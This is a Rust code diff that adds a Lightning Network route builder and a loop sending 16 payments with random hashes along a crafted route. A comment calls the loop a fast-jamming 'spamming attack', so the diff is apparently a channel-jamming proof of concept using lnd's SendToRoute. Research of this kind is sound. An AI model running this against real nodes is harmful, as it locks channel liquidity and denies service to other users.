@@ -253,6 +253,51 @@ impl ChannelFinder {
 		return None;
 	}
 }
+/////////////////////////////////////////////////////////////////
+
+/* Constructs a lnrpc::Route from an array of FoundChannels.  */
+fn make_route( channels: &[FoundChannel]
+	     , amt: i64
+	     , final_cltv: u32
+	     ) -> Route {
+	let amt_msat: i64 = amt * 1000;
+	let mut total_time_lock: u32 = final_cltv;
+	let mut total_fees_msat: i64 = 0;
+	let mut total_amt_msat: i64 = amt_msat;
+	let mut prev_fees: i64 = 0;
+
+	let mut rev_hops: Vec<Hop> = Vec::new();
+
+	/* Build hops in reverse order.  */
+	for c in channels.iter().rev() {
+		let policy = c.policy.as_ref().expect("should exist");
+		let cur_fees = policy.fee_base_msat
+			     + ((total_amt_msat * policy.fee_rate_milli_msat) / 1000000)
+			     ;
+
+		let mut hop = Hop::default();
+		hop.chan_id = c.channel_id;
+		hop.expiry = total_time_lock;
+		hop.amt_to_forward_msat = total_amt_msat;
+		hop.fee_msat = cur_fees;
+		hop.pub_key = hex::encode(&c.dest);
+		rev_hops.push(hop);
+
+		total_amt_msat += cur_fees;
+		total_fees_msat += prev_fees;
+		prev_fees = cur_fees;
+		total_time_lock += policy.time_lock_delta;
+	}
+	let hops: Vec<Hop> = rev_hops.into_iter().rev().collect();
+
+	let mut route = Route::default();
+	route.total_time_lock = total_time_lock;
+	route.total_fees_msat = total_fees_msat;
+	route.total_amt_msat = hops[0].amt_to_forward_msat;
+	route.hops = hops;
+
+	route
+}
 
 /////////////////////////////////////////////////////////////////
 #[tokio::main]
@@ -378,9 +423,26 @@ async fn main() {
 		16777215
 	).expect("we made this channel");
 
-	println!("firstchan = {:#?}", firstchan);
-	println!("bigchan = {:#?}", bigchan);
-	println!("medchan = {:#?}", medchan);
-	println!("smallchan = {:#?}", smallchan);
-	println!("lastchan = {:#?}", lastchan);
+	/* Build our route.  */
+	let route = make_route(
+		&[firstchan, bigchan, medchan, smallchan, lastchan],
+		1000000, 144
+	);
+	/* Make the spamming attack.
+	 * Make this a fast-jamming attack so we do not have to
+	 * worry about making HODL invoices.
+	 * Could instead use HODL invoices.
+	 */
+	for _ in 0..16 {
+		let mut send_req = tonic_lnd::routerrpc::SendToRouteRequest::default();
+		send_req.payment_hash = rand::random::<[u8; 32]>()
+				.to_vec();
+		send_req.route = Some(route.clone());
+		send_req.skip_temp_err = true;
+		client0.router()
+			.send_to_route_v2(send_req)
+			.await
+			.expect("initiating payment should succeed");
+	}
+	sleep(10).await;
 }
